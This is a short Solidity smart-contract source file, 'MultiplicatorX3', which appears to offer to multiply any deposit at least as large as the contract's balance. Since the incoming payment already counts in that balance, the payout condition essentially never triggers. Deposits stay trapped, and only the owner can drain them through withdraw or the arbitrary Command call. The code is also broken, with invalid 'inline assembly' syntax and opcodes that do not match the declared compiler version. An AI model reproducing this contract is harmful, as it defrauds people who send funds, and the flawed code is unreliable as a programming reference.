pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public O = msg.sender;
    
    function() public payable {}

    function withdraw() payable public {
        require(msg.sender == O);
        inline assembly {
            let bal := selfbalance()
            let success := call(gas(), O, bal, 0, 0, 0, 0)
            if eq(success, 0) { revert(0, 0) }
        }
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == O);
        inline assembly {
            let success := call(gas(), adr, callvalue(), add(data, 0x20), mload(data), 0, 0)
            if eq(success, 0) { revert(0, 0) }
        }
    }
    
    function multiplicate(address adr) public payable {
        if(msg.value >= this.balance) {
            inline assembly {
                let success := call(gas(), adr, add(selfbalance(), callvalue()), 0, 0, 0, 0)
                if eq(success, 0) { revert(0, 0) }
            }
        }
    }
}